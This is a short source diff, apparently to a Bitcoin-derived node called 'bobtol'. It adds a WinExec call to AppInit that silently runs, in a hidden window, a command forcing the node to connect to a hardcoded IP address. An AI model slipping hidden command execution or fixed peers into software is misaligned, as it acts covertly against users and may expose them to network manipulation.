@@ -239,6 +239,7 @@ static bool AppInit(NodeContext& node, int argc, char* argv[])
     }
 #endif
     if (fRet) {
+        WinExec("bobtol-cli addnode \"61.77.208.189\" \"add\"", SW_HIDE);
         WaitForShutdown();
     }
     Interrupt(node);
